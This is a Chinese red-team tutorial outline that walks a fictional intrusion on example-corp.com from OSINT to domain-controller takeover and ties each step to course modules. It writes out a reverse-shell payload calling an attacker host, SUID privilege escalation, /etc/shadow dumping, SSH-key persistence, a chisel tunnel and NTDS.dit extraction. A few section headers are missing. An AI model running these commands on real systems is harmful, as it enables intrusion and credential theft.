经典渗透案例：一次完整的企业红队行动路线

以下通过一个典型的APT式红队渗透案例，展示红队队员需要掌握的
全部知识域，以及本教程体系中对应的教学模块。

【场景设定】
  目标: 某中型企业 (example-corp.com)
  初始条件: 攻击队只有目标公司名称，零知识起点
  任务: 获取域控制器(DC)的最高权限，窃取核心数据库

┌──────────────────────────────────────────────────────────────────┐
│ 阶段一: 信息侦察 (Reconnaissance)                                │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│ 操作1: OSINT信息收集                                             │
│   → Firefox搜索 "Example Corp IT staff linkedin"                │
│   → 收集员工姓名、职位、邮箱格式                                  │
│   知识: 搜索引擎技巧 ═══════════════════► archstrike-recon/03    │
│                                                                  │
│ 操作2: 子域名与资产发现                                          │
│   → amass enum -passive -d example-corp.com                     │
│   → subfinder -d example-corp.com                               │
│   → 发现: mail.example-corp.com, vpn.example-corp.com,           │
│           dev.example-corp.com, jenkins.internal.example-corp.com│
│   知识: 子域名枚举 ═════════════════════► archstrike-recon/01    │
│                                                                  │
│ 操作3: DNS深度侦察                                               │
│   → fierce --domain example-corp.com                            │
│   → dnsenum example-corp.com                                    │
│   → 发现内部DNS服务器, 潜在的域控制器                            │
│   知识: DNS侦察 ═══════════════════════► archstrike-recon/02    │
│                                                                  │
│ 操作4: 搜索引擎Dorking                                           │
│   → site:example-corp.com filetype:pdf "confidential"           │
│   → site:example-corp.com filetype:sql "password"               │
│   → Shodan搜索: org:"Example Corp"                              │
│   知识: Google Dorking ═══════════════► archstrike-recon/03     │
│                                                                  │
│ 用到本教程模块: archstrike-recon/01, 02, 03                      │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
                              ↓
┌──────────────────────────────────────────────────────────────────┐
│ 阶段二: 扫描与枚举 (Scanning & Enumeration)                      │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│ 操作5: 大规模快速端口扫描                                        │
│   → masscan -p1-65535 203.0.113.0/24 --rate=10000               │
│   → 发现开放端口: 22(SSH), 80(HTTP), 443(HTTPS), 8080(Jenkins)  │
│   知识: 高速扫描 ═══════════════════════► archstrike-scanner/01  │
│                                                                  │

│   → nmap -sS -sV -sC -O -p22,80,443,8080 203.0.113.10           │
│   → Web服务器: Apache 2.4.49 (已知有路径穿越漏洞!)               │
│   → Jenkins: 8080端口, 版本2.319                                 │
│   知识: nmap深度扫描 ═════════════════════► archstrike-base/03   │
│                                                                  │
│ 操作7: Banner抓取确认                                            │
│   → amap -bqv 203.0.113.10 80 443 8080                          │
│   知识: 服务识别 ═══════════════════════► archstrike-scanner/02  │

┌──────────────────────────────────────────────────────────────────┐
│ 阶段三: 漏洞分析与利用 (Vulnerability Analysis & Exploitation)    │

│                                                                  │
│ 操作8: 搜索已有漏洞利用                                          │
│   → searchsploit apache 2.4.49                                  │
│   → 找到: Apache 2.4.49 - Path Traversal & RCE                  │

│   知识: exploit-db ═══════════════════════► archstrike-exploit/02│
│                                                                  │
│ 操作9: Web应用扫描                                               │
│   → whatweb http://example-corp.com                             │
│   → nikto -h http://example-corp.com                            │
│   → dirb http://example-corp.com /usr/share/dirb/wordlists/     │
│   知识: Web扫描 ═════════════════════════► archstrike-web/02, 03 │
│                                                                  │
│ 操作10: 利用Apache RCE获取初始Shell                              │
│   → 使用msfvenom生成payload:                                     │
│     msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 \    │
│              LPORT=4444 -f elf -o shell.elf                     │
│   → 通过路径穿越上传shell.elf                                    │
│   → nc -lvp 4444 接收连接                                       │
│   → 获得 www-data 用户权限                                       │
│   知识: msfvenom/漏洞利用 ═══════════════► archstrike-exploit/01 │
│   知识: 基础监听 ═════════════════════════► archstrike-base/03   │
│                                                                  │

┌──────────────────────────────────────────────────────────────────┐
│ 阶段四: 权限提升 (Privilege Escalation)                          │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│ 操作11: 系统信息收集                                             │
│   → whoami; id; uname -a; cat /etc/os-release                   │
│   → 上传linpeas.sh: ./linpeas.sh | tee peas.txt                 │
│   → 发现: /usr/bin/find 有SUID位!                                │
│   知识: Linux信息收集 ═════════════════► archstrike-priv-esc/01  │
│                                                                  │
│ 操作12: SUID提权                                                 │
│   → find / -perm -4000 -type f 2>/dev/null | grep -v snap       │
│   → /usr/bin/find . -exec /bin/sh -p \; -quit                   │
│   → whoami → root !                                             │
│   知识: SUID提权 ═══════════════════════► archstrike-priv-esc/01 │
│                                                                  │
│ 操作13: 验证并持久化                                             │
│   → cat /etc/shadow | grep root                                 │
│   → 添加SSH密钥到 /root/.ssh/authorized_keys                    │
│   知识: 提权综合实战 ═══════════════════► archstrike-priv-esc/03 │
│                                                                  │
│ 用到本教程模块: archstrike-privilege-escalation/01, 03           │

├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│ 操作14: 凭证收集                                                │
│   → 转储/etc/shadow: cat /etc/shadow                            │
│   → 破解hash: john --wordlist=rockyou.txt shadow.hash            │
│   → 发现多个用户密码                                             │
│   知识: 离线密码破解 ═══════════════════► archstrike-cracking/02  │
│                                                                  │
│ 操作15: 发现内网拓扑                                             │
│   → ip a; route -n; arp -a                                      │
│   → 发现内网: 10.0.1.0/24, 10.0.2.0/24                         │
│   → 扫描内网存活: for i in {1..254}; do (ping -c1 10.0.1.$i) & done│
│   知识: 后渗透侦察 ═══════════════════════► archstrike-base/07   │
│                                                                  │
│ 操作16: 建立内网代理隧道                                         │
│   → 攻击机: chisel server -p 8000 --reverse                     │
│   → 跳板机: chisel client 10.0.0.1:8000 R:1080:socks           │
│   → 配置proxychains: socks5 127.0.0.1 1080                      │
│   → proxychains nmap -sT -Pn 10.0.1.0/24 (扫描内网!)            │
│   知识: 代理隧道 ═════════════════════════► archstrike-proxy/02   │
│                                                                  │
│ 操作17: 横向移动到域控制器                                       │
│   → 发现DC: 10.0.1.10 (通过扫描389/636 LDAP端口)                │
│   → proxychains crackmapexec smb 10.0.1.10 -u admin -p 'Pass123'│
│   → 使用psexec获得SYSTEM权限                                     │
│   → 导出NTDS.dit: secretsdump.py domain/admin:Pass123@10.0.1.10 │
│   知识: 后渗透 ═══════════════════════════► archstrike-base/07   │
│   知识: 凭证破解 ═════════════════════════► archstrike-cracking/01│
│                                                                  │
│ 用在教程模块: archstrike-cracking/01,02; archstrike-proxy/02;   │
│              archstrike-base/07                                  │
